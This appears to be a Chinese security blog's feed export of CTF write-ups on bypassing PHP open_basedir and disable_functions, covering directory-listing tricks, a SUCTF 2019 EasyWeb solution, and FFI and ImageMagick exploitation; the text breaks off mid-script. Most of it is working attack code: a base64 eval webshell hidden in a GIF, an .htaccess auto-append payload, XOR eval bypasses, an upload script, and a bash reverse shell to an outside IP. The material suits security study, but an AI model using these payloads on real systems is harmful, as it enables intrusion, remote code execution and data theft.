class="hljs-meta">?&gt;</span></code></pre><p>读取指定目录下所有PHP文件</p><h4 id="利用DirectoryIterator-Glob-直接列举目录"><a class="header-anchor" href="#利用DirectoryIterator-Glob-直接列举目录">🍭</a>利用DirectoryIterator + Glob 直接列举目录</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));$file_list = <span class="hljs-keyword">array</span>();<span class="hljs-comment">// normal files</span>$it = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) &#123;    $file_list[] = $f-&gt;__toString();&#125;<span class="hljs-comment">// special files (starting with a dot(.))</span>$it = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) &#123;    $file_list[] = $f-&gt;__toString();&#125;sort($file_list);<span class="hljs-keyword">foreach</span>($file_list <span class="hljs-keyword">as</span> $f)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h2 id="ini-set"><a class="header-anchor" href="#ini-set">🍭</a>ini_set</h2><p>twiter上有一个bypass open_basedir的新方法 。<br>payload</p><pre><code class="hljs gams">&lt;?phpmkdir(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);chdir(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);<span class="hljs-function"><span class="hljs-title">ini_set</span>(<span class="hljs-params">&#x27;open_basedir&#x27;,&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;<span class="hljs-function"><span class="hljs-title">chdir</span>(<span class="hljs-params">&#x27;..&#x27;</span>)</span>;ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-meta"><span class="hljs-meta-keyword">$a</span>=file_get_contents(&#x27;flag&#x27;);</span>var_dump(<span class="hljs-symbol">$</span>a);?&gt;</code></pre><p>分析详见：<a href="https://xz.aliyun.com/t/4720#toc-0">bypass open_basedir的新方法</a></p><h2 id="读目录"><a class="header-anchor" href="#读目录">🍭</a>读目录</h2><p>学习大佬的脚本</p><h4 id="win"><a class="header-anchor" href="#win">🍭</a>win</h4><h5 id="realpath列举目录"><a class="header-anchor" href="#realpath列举目录">🍭</a>realpath列举目录</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));set_error_handler(<span class="hljs-string">&#x27;isexists&#x27;</span>);$dir = <span class="hljs-string">&#x27;d:/test/&#x27;</span>;$file = <span class="hljs-string">&#x27;&#x27;</span>;$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123;     $file = $dir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;    realpath($file);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params">$errno, $errstr</span>)</span><span class="hljs-function"></span>&#123;    $regexp = <span class="hljs-string">&#x27;/File\((.*)\) is not within/&#x27;</span>;    preg_match($regexp, $errstr, $matches);    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($matches[<span class="hljs-number">1</span>])) &#123;        printf(<span class="hljs-string">&quot;%s &lt;br/&gt;&quot;</span>, $matches[<span class="hljs-number">1</span>]);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h5 id="SplFileInfo-getRealPath列举目录"><a class="header-anchor" href="#SplFileInfo-getRealPath列举目录">🍭</a>SplFileInfo::getRealPath列举目录</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));$basedir = <span class="hljs-string">&#x27;D:/test/&#x27;</span>;$arr = <span class="hljs-keyword">array</span>();$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123;     $info = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileInfo</span>($basedir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>);    $re = $info-&gt;getRealPath();    <span class="hljs-keyword">if</span> ($re) &#123;        dump($re);    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dump</span>(<span class="hljs-params">$s</span>)</span>&#123;    <span class="hljs-keyword">echo</span> $s . <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;    ob_flush();    flush();&#125;<span class="hljs-meta">?&gt;</span></code></pre><h5 id="GD库imageftbbox-imagefttext列举目录"><a class="header-anchor" href="#GD库imageftbbox-imagefttext列举目录">🍭</a>GD库imageftbbox/imagefttext列举目录</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));printf(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));set_error_handler(<span class="hljs-string">&#x27;isexists&#x27;</span>);$dir = <span class="hljs-string">&#x27;d:/test/&#x27;</span>;$file = <span class="hljs-string">&#x27;&#x27;</span>;$chars = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; strlen($chars); $i++) &#123;     $file = $dir . $chars[$i] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;    <span class="hljs-comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span>    <span class="hljs-comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span>    imageftbbox(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, $file, <span class="hljs-string">&#x27;aaa&#x27;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params">$errno, $errstr</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">global</span> $file;    <span class="hljs-keyword">if</span> (stripos($errstr, <span class="hljs-string">&#x27;Invalid font filename&#x27;</span>) === <span class="hljs-literal">FALSE</span>) &#123;        printf(<span class="hljs-string">&quot;%s&lt;br/&gt;&quot;</span>, $file);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="Linux"><a class="header-anchor" href="#Linux">🍭</a>Linux</h4><h5 id="bindtextdomain暴力猜解目录"><a class="header-anchor" href="#bindtextdomain暴力猜解目录">🍭</a>bindtextdomain暴力猜解目录</h5><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));$re = bindtextdomain(<span class="hljs-string">&#x27;xxx&#x27;</span>, $_GET[<span class="hljs-string">&#x27;dir&#x27;</span>]);var_dump($re);<span class="hljs-meta">?&gt;</span></code></pre><p>dir传入的参数是目录，如果目录存在，就返回目录路径，不存在就返回bool(false)，用于暴力猜解目录。</p><h2 id="SUCTF-2019-EasyWeb"><a class="header-anchor" href="#SUCTF-2019-EasyWeb">🍭</a>[SUCTF 2019]EasyWeb</h2><p>题目给了源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span>    $userdir = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);    <span class="hljs-keyword">if</span>(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">&quot;file&quot;</span>]))&#123;        $tmp_name = $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];        $name = $_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];        $extension = substr($name, strrpos($name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>,$extension)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);         <span class="hljs-keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==<span class="hljs-literal">False</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);    <span class="hljs-keyword">if</span>(!exif_imagetype($tmp_name)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);         $path= $userdir.<span class="hljs-string">&quot;/&quot;</span>.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[<span class="hljs-string">&#x27;_&#x27;</span>];<span class="hljs-keyword">if</span> (!$hhh)&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">if</span>(strlen($hhh)&gt;<span class="hljs-number">18</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);&#125;<span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);$character_type = count_chars($hhh, <span class="hljs-number">3</span>);<span class="hljs-keyword">if</span>(strlen($character_type)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<span class="hljs-keyword">eval</span>($hhh);<span class="hljs-meta">?&gt;</span></code></pre><p>先看get_the_flag()：</p><p>过滤了文件后缀，不能出现“ph”，上传图片马配合 .htaccess 即可，且 exif_imagetype  判断一个图像的类型，读取一个图像的第一个字节并检查其签名，所以图片马的开头要加上GIF89a，文件内容中不能有“&lt;?”，所以要编码一下（原理详见.htaccess总结）：</p><pre><code class="hljs abnf"><span class="hljs-attribute">GIF98a12GIF98a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2EnXSk7Pz4</span>=</code></pre><p>.htaccess:</p><pre><code class="hljs vala"><span class="hljs-meta">#define width 1</span><span class="hljs-meta">#define height 1</span>AddType application/x-httpd-php .gifphp_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_a31f0ebf81054b852f70b3283d8594b8/shell.gif&quot;</span><span class="hljs-meta">#先随便上传个文件确定文件存储位置</span></code></pre><p>下面还有一个正则：</p><pre><code class="hljs asciidoc">$hhh = @$<span class="hljs-emphasis">_GET[&#x27;_</span>&#x27;];......if ( preg<span class="hljs-emphasis">_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_</span>&amp;.,|=[\x7F]+/i&#x27;, $hhh) )<span class="hljs-code">    die(&#x27;Try something else!&#x27;);</span>......eval($hhh);</code></pre><p>直接异或：</p><pre><code class="hljs perl">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo   // &#123;$_GET&#125;&#123;%ff&#125;</code></pre><p>然后用之前在本地写个upload.html上传文件，或者用脚本上传皆可</p><pre><code class="hljs perl">import requestsurl = <span class="hljs-string">&quot;http://f627eb1d-1179-494e-ab98-f95610f52fd0.node4.buuoj.cn:81/?_=<span class="hljs-subst">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;</span>&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span>shell = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;shell.gif&#x27;</span>,<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;shell.gif&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>),<span class="hljs-string">&#x27;image/gif&#x27;</span>)&#125;r = requests.post(url=url,files=shell)<span class="hljs-keyword">print</span>(r.text)htaccess = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>),<span class="hljs-string">&#x27;image/gif&#x27;</span>)&#125;r2 = requests.post(url=url,files=htaccess)<span class="hljs-keyword">print</span>(r2.text)</code></pre><p>得到目录</p><p><img src="/2021/08/17/open/1.png" alt="1"></p><p>蚁剑连接</p><p><img src="/2021/08/17/open/2.png" alt="2"></p><p>有限制，查看phpinfo</p><p><img src="/2021/08/17/open/3.png" alt="3"></p><p>启用了open_basedir，用上面的int_set方法</p><p>payload</p><pre><code class="hljs mel">?penson=<span class="hljs-keyword">chdir</span>(%27img%27);ini_set(%27open_basedir%27,%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));</code></pre><p>执行:</p><p><img src="/2021/08/17/open/22.png" alt="22"></p><p>读取</p><pre><code class="hljs mel">penson=<span class="hljs-keyword">chdir</span>(%27img%27);ini_set(%27open_basedir%27,%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);<span class="hljs-keyword">chdir</span>(%27..%27);ini_set(%27open_basedir%27,%27/%27);echo file_get_contents(<span class="hljs-string">&#x27;/THis_Is_tHe_F14g&#x27;</span>);</code></pre><p>执行：</p><p><img src="/2021/08/17/open/23.png" alt="23"></p><p>参考：<a href="https://www.jianshu.com/p/cf2cd07d02cf">https://www.jianshu.com/p/cf2cd07d02cf</a></p><p><a href="https://blog.csdn.net/weixin_33810302/article/details/87981560">https://blog.csdn.net/weixin_33810302/article/details/87981560</a></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass Disable Functions (三)</title>
    <link href="/2021/08/16/ff3/"/>
    <url>/2021/08/16/ff3/</url>
    
    <content type="html"><![CDATA[<h2 id="利用-GC-UAF"><a class="header-anchor" href="#利用-GC-UAF">🍭</a>利用 GC UAF</h2><h4 id="条件"><a class="header-anchor" href="#条件">🍭</a>条件</h4><ul><li>Linux 操作系统</li><li>PHP 版本(7.x)</li></ul><h4 id="原理"><a class="header-anchor" href="#原理">🍭</a>原理</h4><p>此漏洞利用PHP垃圾收集器中存在三年的一个 <a href="https://bugs.php.net/bug.php?id=72530">bug</a> ，通过PHP垃圾收集器中堆溢出来绕过 <code>disable_functions</code> 并执行系统命令。利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><h4 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h4><p>利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><p>在pwn放入执行命令：</p><p><img src="/2021/08/16/ff3/1.png" alt="1"></p><p>也可修改成<code>pwn($_POST['a']);</code>较为方便。</p><p>利用方法：将利用脚本exploit.php上传到目标主机有权限的目录，然后将exploit.php包含进来并使用POST方法提供你想要执行的命令即可：</p><pre><code class="hljs dts">/?xxx=aW5jbHVkZSgiL3Zhci90bXAvZXhwbG9pdC5waHAiKTs=<span class="hljs-meta"># <span class="hljs-meta-keyword">include</span>(<span class="hljs-string">&quot;/var/tmp/exploit.php&quot;</span>);</span><span class="hljs-symbol">POST:</span> a=ls /</code></pre><p>或者利用蚁剑的插件：PHP_GC_UAF</p><h2 id="Backtrace-UAF"><a class="header-anchor" href="#Backtrace-UAF">🍭</a>Backtrace UAF</h2><h4 id="条件-v2"><a class="header-anchor" href="#条件-v2">🍭</a>条件</h4><ul><li>Linux 操作系统</li><li>PHP 版本(7.x)</li></ul><h4 id="原理-v2"><a class="header-anchor" href="#原理-v2">🍭</a>原理</h4><p>该漏洞利用在debug_backtrace()函数中使用了两年的一个 <a href="https://bugs.php.net/bug.php?id=76047">bug</a>。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p><h4 id="利用-v2"><a class="header-anchor" href="#利用-v2">🍭</a>利用</h4><p>利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p><p>利用方法与上面一样</p><h2 id="利用-Json-Serializer-UAF"><a class="header-anchor" href="#利用-Json-Serializer-UAF">🍭</a>利用 Json Serializer UAF</h2><h4 id="条件-v3"><a class="header-anchor" href="#条件-v3">🍭</a>条件</h4><ul><li>Linux 操作系统</li><li>PHP 版本<ul><li>7.1 - all versions to date</li><li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul></li></ul><h4 id="原理-v3"><a class="header-anchor" href="#原理-v3">🍭</a>原理</h4><p>此漏洞利用json序列化程序中的释放后使用<a href="https://bugs.php.net/bug.php?id=77843">漏洞</a>，利用json序列化程序中的堆溢出触发，以绕过 <code>disable_functions</code> 和执行系统命令。</p><h4 id="利用-v3"><a class="header-anchor" href="#利用-v3">🍭</a>利用</h4><p>利用脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p><p>利用方法和其他的UAF绕过disable_functions相同。蚁剑也有相关插件 Json Serializer UAF</p><h2 id="利用-SplDoublyLinkedList-UAC"><a class="header-anchor" href="#利用-SplDoublyLinkedList-UAC">🍭</a>利用 SplDoublyLinkedList UAC</h2><h4 id="条件-v4"><a class="header-anchor" href="#条件-v4">🍭</a>条件</h4><ul><li>PHP 版本<ul><li>PHP v7.4.10及其之前版本</li><li>PHP v8.0（Alpha）</li></ul></li></ul><h4 id="原理-v4"><a class="header-anchor" href="#原理-v4">🍭</a>原理</h4><p>2020年9月20号有人在 <a href="http://bugs.php.net">bugs.php.net</a> 上发布了一个新的 UAF <a href="https://bugs.php.net/bug.php?id=80111">BUG</a> ，报告人已经写出了 bypass disabled functions 的利用脚本并且私发了给官方，不过官方似乎还没有修复，原因不明。</p><p>PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等。</p><p>详情请看：<a href="https://www.freebuf.com/articles/web/251017.html">https://www.freebuf.com/articles/web/251017.html</a></p><h3 id="利用方法"><a class="header-anchor" href="#利用方法">🍭</a>利用方法</h3><p>利用脚本：<a href="https://xz.aliyun.com/t/8355#toc-3">https://xz.aliyun.com/t/8355#toc-3</a></p><p>需要执行的命令：</p><p><img src="/2021/08/16/ff3/2.png" alt="2"></p><p>利用方法一致</p><h2 id="利用-FFI-扩展执行命令"><a class="header-anchor" href="#利用-FFI-扩展执行命令">🍭</a>利用 FFI 扩展执行命令</h2><h4 id="条件-v5"><a class="header-anchor" href="#条件-v5">🍭</a>条件</h4><ul><li>Linux 操作系统</li><li>PHP &gt;= 7.4</li><li>开启了 FFI 扩展且 <code>ffi.enable=true</code></li></ul><h4 id="原理-v5"><a class="header-anchor" href="#原理-v5">🍭</a>原理</h4><p>PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在PHP代码中去调用C代码。FFI的使用非常简单，只用声明和调用两步就可以。</p><p>首先我们使用 <code>FFI::cdef()</code> 函数在PHP中声明一个我们要调用的这个C库中的函数以及使用到的数据类型：</p><pre><code class="hljs elixir"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(char* command);&quot;</span>);   <span class="hljs-comment"># 声明C语言中的system函数</span></code></pre><p>返回一个新创建的FFI对象，然后使用以下方法即可调用这个对象中所声明的函数：</p><pre><code class="hljs clean">$ffi -&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);   # 执行ls /命令并将结果写入/tmp/res.txt</code></pre><p>由于system函数执行命令无回显，所以需要将执行结果写入到tmp等有权限的目录中，最后再使用 <code>echo file_get_contents(&quot;/tmp/res.txt&quot;);</code> 查看执行结果即可。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><h4 id="利用-v4"><a class="header-anchor" href="#利用-v4">🍭</a>利用</h4><p>通过极客大挑战 2020]FighterFightsInvincibly来演示利用PHP 7.4 FFI来bypass disable_functions：</p><p>源码可以看到</p><p><img src="/2021/08/16/ff3/4.png" alt="4"></p><p>可以动态的执行php代码，联想到之前学的create_function代码注入：</p><pre><code class="hljs autoit">create_function(<span class="hljs-built_in">string</span> $args,<span class="hljs-built_in">string</span> $code)//<span class="hljs-built_in">string</span> $args 声明的函数变量部分//<span class="hljs-built_in">string</span> $code 执行的方法代码部分</code></pre><p>payload</p><pre><code class="hljs routeros">/?<span class="hljs-attribute">fighter</span>=create_function&amp;fights=&amp;invincibly=;&#125;eval(<span class="hljs-variable">$_POST</span>[whoami]);/*</code></pre><p>蚁剑链接无法执行命令，查看phpinfo</p><p><img src="/2021/08/16/ff3/6.png" alt="6"></p><p>根据题目名字的描述，应该是让我们使用PHP 7.4 的FFI绕过disabled_function，phpinfo中也FFI处于enable状态</p><h5 id="利用FFI调用C库的system函数"><a class="header-anchor" href="#利用FFI调用C库的system函数">🍭</a>利用FFI调用C库的system函数</h5><p>先尝试调用C库的system函数：</p><pre><code class="hljs php">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);$ffi-&gt;system(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/res.txt&quot;</span>);<span class="hljs-comment">/*</span></code></pre><p>C库的system函数执行没有回显，需要将执行结果写入到tmp等有权限的目录中，再使用 <code>echo file_get_contents(&quot;/tmp/res.txt&quot;);</code> 查看执行结果即可。但是这道题执行后却发现有任何结果，可能是我们没有写文件的权限。尝试反弹shell：</p><pre><code class="hljs awk"><span class="hljs-regexp">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&#x27;bash -c &quot;bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">192</span>.xxx.xxx.<span class="hljs-number">72</span><span class="hljs-regexp">/2333 0&gt;&amp;1&quot;&#x27;)/</span>*</code></pre><p>也不行</p><h5 id="利用FFI调用C库的popen函数"><a class="header-anchor" href="#利用FFI调用C库的popen函数">🍭</a>利用FFI调用C库的popen函数</h5><pre><code class="hljs stata"><span class="hljs-keyword">FILE</span> *popen(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* command, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-keyword">type</span>);</code></pre><p>popen()函数会调用fork()产生子进程，然后从子进程中调用 /bin/sh -c 来执行参数 command 的指令。参数 type 可使用 “r”代表读取，”w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。所以可以利用C库的popen()函数来执行命令，但要读取到结果还需要C库的fgetc等函数。payload如下</p><pre><code class="hljs php">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);$o = $ffi-&gt;popen(<span class="hljs-string">&quot;ls /&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);$d = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span>(($c = $ffi-&gt;fgetc($o)) != <span class="hljs-number">-1</span>)&#123;$d .= str_pad(strval(dechex($c)),<span class="hljs-number">2</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-number">0</span>);&#125;$ffi-&gt;pclose($o);<span class="hljs-keyword">echo</span> hex2bin($d);<span class="hljs-comment">/* </span></code></pre><p>执行命令：</p><p><img src="/2021/08/16/ff3/7.png" alt="7"></p><h4 id="利用FFI调用PHP源码中的函数"><a class="header-anchor" href="#利用FFI调用PHP源码中的函数">🍭</a>利用FFI调用PHP源码中的函数</h4><p>FFI可以直接调用php源码中的函数，比如php_exec()函数，当他参数type为3时对应着调用的是passthru()函数，其执行命令可以直接将结果原始输出，payload如下：</p><pre><code class="hljs elixir">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int php_exec(int type, char *cmd);&quot;</span>);<span class="hljs-variable">$ffi</span>-&gt;php_exec(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;/readflag&quot;</span>);<span class="hljs-regexp">/*</span></code></pre><p>执行命令</p><p><img src="/2021/08/16/ff3/5.png" alt="5"></p><p>就。。。。。。离谱，这个flag不完整？？</p><p>用蚁剑的FFI插件</p><p><img src="/2021/08/16/ff3/3.png" alt="3"></p><p>一样不完整。。。。。</p><h2 id="利用-ImageMagick"><a class="header-anchor" href="#利用-ImageMagick">🍭</a>利用 ImageMagick</h2><h4 id="条件-v6"><a class="header-anchor" href="#条件-v6">🍭</a>条件</h4><ul><li>目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）</li><li>安装了php-imagick拓展并在php.ini中启用；</li><li>编写php通过new Imagick对象的方式来处理图片等格式文件；</li><li>PHP &gt;= 5.4</li></ul><h4 id="原理-v6"><a class="header-anchor" href="#原理-v6">🍭</a>原理</h4><p>imagemagick是一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。</p><p>这里利用的是ImageMagick的一个漏洞（CVE-2016-3714）。只要将精心构造的图片上传至使用漏洞版本的ImageMagick，ImageMagick会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。因此很多具有头像上传、图片转换、图片编辑等具备图片上传功能的网站都可能会中招。如果在phpinfo中看到ImageMagick，就可以尝试。</p><h4 id="利用-v5"><a class="header-anchor" href="#利用-v5">🍭</a>利用</h4><p>利用脚本：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . ini_get(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;$command = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? $argv[<span class="hljs-number">1</span>] : $_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">if</span> ($command == <span class="hljs-string">&#x27;&#x27;</span>) &#123;   $command = <span class="hljs-string">&#x27;id&#x27;</span>;&#125;$exploit = &lt;&lt;&lt;EOFpush graphic-contextviewbox <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">640</span> <span class="hljs-number">480</span>fill <span 